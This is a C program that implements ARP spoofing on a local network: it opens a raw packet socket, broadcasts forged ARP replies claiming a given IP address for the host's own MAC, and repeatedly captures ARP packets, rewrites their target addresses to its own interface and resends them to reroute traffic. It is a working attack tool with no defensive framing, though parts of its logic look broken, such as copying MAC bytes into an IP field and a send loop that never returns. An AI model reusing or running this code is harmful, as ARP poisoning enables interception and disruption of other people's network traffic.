#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "stdlib.h"
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#define REQUEST "IP: %s - MAC: %02X:%02X:%02X:%02X:%02X:%02X\n"

typedef struct arp_message
{
	unsigned char dest_mac[6]; // eth
	unsigned char src_mac[6]; // eth
	unsigned short type; // eth
	unsigned short hardware_type; // arp
	unsigned short protocol_type; // arp
	unsigned char hardware_adress_size; // arp
	unsigned char protocol_adress_size; // arp
	unsigned short opcode; // arp
	unsigned char sender_mac[6]; // arp
	unsigned char sender_ip[4]; // arp
	unsigned char target_mac[6]; // arp
	unsigned char target_ip[4]; // arp
} arp_message_t;

void print_msg(arp_message_t msg)
{
	FILE *fp = fopen("log.txt", "w+");
	if(fp==NULL){
		printf("Cant open file pointer \n");
		exit(-1);
	}
	fprintf(fp,"Destination MAC: %x.%x.%x.%x.%x.%x\n", msg.dest_mac[0], msg.dest_mac[1], msg.dest_mac[2], msg.dest_mac[3], msg.dest_mac[4], msg.dest_mac[5]);
	fprintf(fp,"Source MAC: %x.%x.%x.%x.%x.%x\n", msg.src_mac[0], msg.src_mac[1], msg.src_mac[2], msg.src_mac[3], msg.src_mac[4], msg.src_mac[5]);
	fprintf(fp,"Type: %d\n\n", msg.type);

	fprintf(fp,"Hardware type: %x\n", msg.hardware_type);
	fprintf(fp,"Protocol type: %x\n", msg.protocol_type);
	fprintf(fp,"Hardware address size: %d\n", msg.hardware_adress_size);
	fprintf(fp,"Protocol address size: %d\n", msg.protocol_adress_size);
	fprintf(fp,"Opcode: %d\n", msg.opcode);
	fprintf(fp,"Sender MAC: %x.%x.%x.%x.%x.%x\n", msg.sender_mac[0], msg.sender_mac[1], msg.sender_mac[2], msg.sender_mac[3], msg.sender_mac[4], msg.sender_mac[5]);
	fprintf(fp,"Sender IP: %d.%d.%d.%d\n", msg.sender_ip[0], msg.sender_ip[1], msg.sender_ip[2], msg.sender_ip[3]);
	fprintf(fp,"Target MAC: %x.%x.%x.%x.%x.%x\n", msg.target_mac[0], msg.target_mac[1], msg.target_mac[2], msg.target_mac[3], msg.target_mac[4], msg.target_mac[5]);

	fprintf(fp,"Target IP: %d.%d.%d.%d\n\n", msg.target_ip[0], msg.target_ip[1], msg.target_ip[2], msg.target_ip[3]);
	fclose(fp);
}

int send_arp(int rsfd, arp_message_t *msg, ssize_t msgsize, struct sockaddr socket_address){
    int num_bytes, count = 0;
    do
    {

        if ((num_bytes = sendto(rsfd, msg, msgsize, 0,(struct sockaddr *) &socket_address, sizeof(socket_address))) < 0)
        {
            perror("Error! Package cannot be sent.");
            return -1;
        }
        else
        {
            count++;
        }

        sleep(1);
    } while (1);

		return count;
}
int main(int argc, char *argv[])
{
	struct ifreq ifr;
	struct sockaddr socket_address;
	unsigned char ip[4];
	int rsfd, optval, n;
	arp_message_t msg;
	int fd=open("arp_reroute.txt", O_WRONLY|O_APPEND|O_CREAT, 0666);
	dup2(fd, 1);
	// Must be run with 2 arguments
	if (argc != 3){
			printf("USAGE: arp <interface-name> <ip-address>\n" );
			return -1;
		}

	// Opening socket
	if((rsfd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP))) < 0)
	{
		perror("Error! Socket cannot be opened.");
		return -1;
	}

	// Set options on sockets
	if(setsockopt(rsfd, SOL_SOCKET, SO_BROADCAST, &optval, sizeof(optval)) < 0)
	{
		perror("Error! 'setsockopt' function did not work.");
		return -1;
	}

    // Creating package
    // send_arp(char** argv, int rsfd, arp_message_t msg)
    // Interface name
    strcpy(ifr.ifr_name, argv[1]);

	// Get sender MAC
	if(ioctl(rsfd, SIOCGIFHWADDR, &ifr) < 0)
	{
		perror("Error! Sender MAC cannot be gotten.");
		return -1;
	}

	// Byte copy --> void bcopy(const void *src, void *dest, size_t n);
	bcopy(&ifr.ifr_hwaddr.sa_data, &msg.sender_mac, 6);
	bcopy(&ifr.ifr_hwaddr.sa_data, &msg.src_mac, 6);

	// Get sender IP
	if(ioctl(rsfd, SIOCGIFADDR, &ifr) < 0)
	{
		perror("Error! Sender IP cannot be gotten.");
		return -1;
	}



	// For broadcast fill the dest_mac with ff:ff:ff:ff:ff:ff
	memset(&msg.dest_mac, 0xff, 6);

	msg.type = htons(ETH_P_ARP);
	msg.hardware_type = htons(ARPHRD_ETHER);
	msg.protocol_type = htons(ETH_P_IP);
	msg.hardware_adress_size = 6;
	msg.protocol_adress_size = 4;
	msg.opcode = htons(ARPOP_REPLY);

	inet_aton(argv[2], msg.sender_ip);

  // copy our mac as target mac
  // bcopy(&ifr.ifr_hwaddr.sa_data, &msg.target_mac, 6);
	memset(&msg.target_mac, 0xff, 6);
	inet_aton(argv[2], msg.target_ip);

	// target ip??
	strncpy(ip, msg.target_ip, 4);
	bzero(&socket_address, sizeof(socket_address));
	strcpy(socket_address.sa_data, argv[1]);

	// Package created

	print_msg(msg);

	ssize_t msgsize=sizeof(msg);

	do
	{
		bzero(&socket_address, sizeof(socket_address));
		bzero(&msg, sizeof(msg));
		n = sizeof(socket_address);

		if(recv(rsfd, &msg, sizeof(msg), 0)==-1)
		{
			perror("Error!");
			return -1;
		}
		// char *dest_ip;
		// dest_ip=inet_ntoa(msg.target_ip);

		// fprintf(stdout, REQUEST, argv[2],
		// 		msg.sender_mac[0], msg.sender_mac[1], msg.sender_mac[2],
		// 		msg.sender_mac[3], msg.sender_mac[4], msg.sender_mac[5]);

		char dest_ip[INET_ADDRSTRLEN], src_ip[INET_ADDRSTRLEN];
		snprintf(src_ip, INET_ADDRSTRLEN, "%d.%d.%d.%d\n", msg.sender_ip[0], msg.sender_ip[1], msg.sender_ip[2], msg.sender_ip[3]);
		snprintf(dest_ip, INET_ADDRSTRLEN, "%d.%d.%d.%d\n", msg.target_ip[0], msg.target_ip[1], msg.target_ip[2], msg.target_ip[3]);

			printf("%s\n", src_ip);
			printf("%s\n", dest_ip);
			printf("Target MAC: %x.%x.%x.%x.%x.%x\n", msg.target_mac[0], msg.target_mac[1], msg.target_mac[2], msg.target_mac[3], msg.target_mac[4], msg.sender_mac[5]);
			printf("------------------\n");

			printf("Rerouting \n" );
			bcopy(&ifr.ifr_hwaddr.sa_data[2], &msg.target_ip, 4);
			bcopy(&ifr.ifr_hwaddr.sa_data, &msg.target_mac, 6);

			snprintf(src_ip, INET_ADDRSTRLEN, "%d.%d.%d.%d\n", msg.sender_ip[0], msg.sender_ip[1], msg.sender_ip[2], msg.sender_ip[3]);
			snprintf(dest_ip, INET_ADDRSTRLEN, "%d.%d.%d.%d\n", msg.target_ip[0], msg.target_ip[1], msg.target_ip[2], msg.target_ip[3]);
			printf("%s\n", src_ip);
			printf("%s\n", dest_ip);
			printf("Source MAC: %x.%x.%x.%x.%x.%x\n", msg.sender_mac[0], msg.sender_mac[1], msg.sender_mac[2], msg.sender_mac[3], msg.sender_mac[4], msg.sender_mac[5]);
			printf("Target MAC: %x.%x.%x.%x.%x.%x\n", msg.target_mac[0], msg.target_mac[1], msg.target_mac[2], msg.target_mac[3], msg.target_mac[4], msg.target_mac[5]);
			printf("------------------\n");

			 msgsize=sizeof(msg);
			send_arp(rsfd, &msg, msgsize,socket_address);
		sleep(1);

	} while(1);

	close(rsfd);
	return(0);
}
